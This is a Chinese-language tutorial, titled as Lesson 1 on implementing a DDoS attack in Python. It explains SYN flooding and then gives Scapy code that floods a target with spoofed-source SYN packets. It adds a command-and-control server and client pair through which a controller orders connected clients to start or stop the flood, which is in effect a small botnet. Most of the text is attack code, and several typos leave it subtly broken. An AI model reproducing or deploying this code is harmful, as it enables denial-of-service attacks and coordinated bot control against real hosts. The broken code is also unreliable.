第一课. Python实现DDoS攻击

关键词：SYN泛洪，Scapy，argparse模块，socket模块

一. 基础知识

SYN泛洪攻击，一种常见的DoS方式。通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽（CPU满负荷或内存不足）。具体来讲，在TCP三次握手过程中，客户端向服务器发送SYN报文后，不再响应服务器的回应报文。而服务器会在协议栈留出缓冲区存储握手过程，大量的连接请求都挂起在半连接状态。

Scapy3K，即Scapy的Python3版本。Scapy是一个交互式数据包处理程序，可以发送、嗅探、解析和伪造网络数据包。它可以作为一个独立程序，也可以作为Python的第三方库使用。Scapy构造一个数据包非常简单，如下可构造一个SYN数据包。我们将IP包和TCP包组合在一起，形成一个完整的TCP数据包，其中，flags值为S说明要发送SYN数据包。

pkt = IP(src='202.121.0.12', dst='192.168.0.100')/TCP(dport=80,flags="S")
send(pkt)
#SCAPY DOS脚本
from scapy.all import *
import random

def synFlood(tgt, dPort):
  srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199'] #伪造源地址
  for sPort in range(1024,65535): #随机源端口
    index = random.randrange(4)  #随机选取源地址
    ipLayer = IP(src=srcList[index], dst=tgt)
    tcpLayer = TCP(sport=sPort, dport=dPort,flag="S")
    packet = ipLayer / tcpLayer
    send(packet)

argparse命令解析库，实现程序命令行参数解析。例如，我们规定好Server端控制Client端的命令格式。

# -H xxx.xxx.xxx.xxx -p xxxx -c <start|stop>

如下所示，我们创建一个ArgumentParser对象，使用description添加描述信息，使用add_argument添加我们想要解析的参数，其中的dest是通过parse_arg()函数返回的对象中的一个属性的名称，help选项是为了自动生成帮助信息。argparse常用参数在这里，包括default，required等。

import argparse
parser = argparse.ArgumentParser(description='Process some integers')
parser.add_argument('-p', dest='port',type=int, help='An port number')
parser.add_argument('-H', dest='host',type=str, help='Ip address of client')
parser.add_argument('-c', dest='cmd',type=str)

socket模块，非常方便地实现网络中的信息交换，一般需要指定IP地址，协议类型，端口号即可。如下为客户端和服务器端的代码示例。

# Client
import socket
s = socket.socket(socket.AF_INT, socket.SOCK_STREAM) #AF_INT->IPV4协议，STREAM->基于流的TCP协议
s.connect(('192.168.0.100',7786))

服务器端绑定一个地址和端口，0.0.0.0表示绑定所有网络地址。开始监听端口后，设定最大连接数为10，最后循环等待新连接，并将已连接的sock对象添加到列表中。accept（）默认是阻塞的，还可以通过settimeout（）设定等待时间或者setblocking（）设定为非阻塞模式。

#Server
import socket
cliList = []
s = socket.socket(socket.AF_INT, socket.SOCK_STREAM)
s.bind(('0.0.0.0',7786))
s.listen(10)
while True:
    sock, addr = s.accept()
    cliList.append(sock)

二. 具体实现

首先在server端需要实现：1）接收客户端连接；2）向客户端发送命令的功能。

import socket
import argparse
from threading import Thread

socketList = []

def sendCmd(cmd):
    print('send command...')
    for sock in socketList:
        sock.send(cmd.encode('utf-8'))

def waitConnect(s):
    while True:
        sock, addr = s.accept()
        if sock not in socketList:
            socketList.append(sock)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',58868))
    s.listen(1024)
    t = Thread(target=waitConnect, args=(s,)) #开新线程等待客户端连接，以免阻塞输入命令
    t.start()
    #等待客户端连入
  	print('Wait for a clinet to connect')
    while not len(socketList):
        pass
    print('A client connected!')
    #等待用户输入命令,并发送至客户端
    while True:
        print('='*50)
        print('The command format # -H xxx.xxx.xxx.xxx -p xxxx -c <start|stop>')
        cmd_str = input('Please input cmd')
        if len(cmd_str):
            if cmd_str[0] == '#':
                sendCmd(cmd_str)
 
if __name__ == '__main__':
    main()

在Client需要实现：1）主动连接server端；2）接收server命令后发起攻击。

import random
import socket
import argparse
import sys
import os
from multiprocessing import Process
from scapy.all import *

curProcess = None
def synFlood(tgt, dPort):
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199'] #伪造源地址
    for sPort in range(1024,65535): #随机源端口
      index = random.randrange(4)  #随机选取源地址
      ipLayer = IP(src=srcList[index], dst=tgt)
      tcpLayer = TCP(sport=sPort, dport=dPort,flag="S")
      packet = ipLayer / tcpLayer
      send(packet)

def cmdHandle(sock,parser):
		global curProcess  #全局变量，判断当前是否有进程正在进行攻击
    while True:
        data = sock.recv(1024).decode('utf-8')
        if len(data) == 0:
            print('The data is empty')
            return
        if data[0] == '#':
            try:
               options = parser.parse_args(data[1:].split()) #这里学一下
               m_host = options.host
               m_port = options.port
               m_cmd = options.cmd #判断是start还是stop
               if m_cmd.lower() == 'start':
                    if curProcess != None and curProcess.is_alive(): #重新发动攻击
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('The synFlood is start')
                    p = Process(target=synFlood, args=(m_host,m_port))
                    p.start()
                    curProcess = p
               elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print('Failed to perform the command')
                         
def main():
    parser = argparse.ArgumentParser(description='Process some integers')
		parser.add_argument('-p', dest='port',type=int, help='An port number')
		parser.add_argument('-H', dest='host',type=str, help='Ip address of client')
		parser.add_argument('-c', dest='cmd',type=str)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('XXXXXX', 58868))
        print('To connected server success')
        print('='*40)
        cmdHandle(s,parse)
    except:
        print('The network connected failed')
        print('Plese restart the script')
        sys.exit(0)
if __name__ = '__main__':
    main()
